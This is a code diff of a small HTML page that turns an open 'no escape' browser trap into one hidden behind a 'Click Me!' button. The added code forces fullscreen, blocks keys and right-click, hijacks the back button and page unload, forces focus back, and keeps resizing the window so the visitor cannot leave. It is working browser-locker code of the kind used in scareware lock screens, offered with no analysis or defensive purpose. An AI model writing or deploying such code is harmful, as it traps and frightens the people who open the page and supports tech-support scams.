@@ -2,52 +2,69 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>no escape</title>
+<title>click me</title>
 <style>
-  html, body {
-    margin:0;
-    padding:0;
-    height:100%;
-    overflow:hidden;
-    background:black;
-    color:white;
+  body {
     display:flex;
     justify-content:center;
     align-items:center;
+    height:100vh;
+    margin:0;
     font-family:sans-serif;
-    user-select:none;
+    background:#f0f0f0;
+    color:#333;
+  }
+  button{
+    padding:20px 40px;
+    font-size:1.5rem;
+    cursor:pointer;
   }
 </style>
 <script>
-  // prevent closing / back / refresh
-  window.onbeforeunload = function(){ return "you can't leave!"; };
-  history.pushState(null, null, location.href);
-  window.onpopstate = function(){ history.pushState(null, null, location.href); };
+  function trapMode(){
+    // go fullscreen
+    if(document.documentElement.requestFullscreen){
+      document.documentElement.requestFullscreen();
+    } else if(document.documentElement.webkitRequestFullscreen){
+      document.documentElement.webkitRequestFullscreen();
+    }
 
-  // block keys (alt+f4, ctrl+w, ctrl+r, etc)
-  document.addEventListener("keydown", e => {
-    e.preventDefault();
-    e.stopPropagation();
-  });
+    // prevent closing / back / refresh
+    window.onbeforeunload = ()=> "You cannot leave!";
+    history.pushState(null, null, location.href);
+    window.onpopstate = ()=> history.pushState(null, null, location.href);
 
-  // focus trap
-  window.onblur = function(){ window.focus(); };
+    // block keys
+    document.addEventListener("keydown", e=>{ e.preventDefault(); e.stopPropagation(); });
 
-  // keep resizing to mess with manual resizing
-  function keepFullScreen(){
-    window.moveTo(0,0);
-    window.resizeTo(screen.width, screen.height);
-    setTimeout(keepFullScreen, 500);
-  }
+    // block right-click
+    document.addEventListener("contextmenu", e=>{ e.preventDefault(); });
 
-  window.onload=function(){
+    // force focus
+    window.onblur = ()=> window.focus();
+
+    // keep resizing
+    function keepFullScreen(){
+      window.moveTo(0,0);
+      window.resizeTo(screen.width, screen.height);
+      setTimeout(keepFullScreen,500);
+    }
     keepFullScreen();
+
+    // optional: subtle moving text so it looks “alive”
     let h=document.createElement("h1");
-    h.innerText="YOU CANNOT CLOSE THIS!";
+    h.innerText="You cannot leave!";
+    h.style.position="absolute";
+    h.style.top="50%";
+    h.style.left="50%";
+    h.style.transform="translate(-50%, -50%)";
     h.style.fontSize="3rem";
+    h.style.color="#333";
     document.body.appendChild(h);
   }
 </script>
 </head>
-<body></body>
+<body>
+  <button onclick="trapMode()">Click Me!</button>
+</body>
 </html>
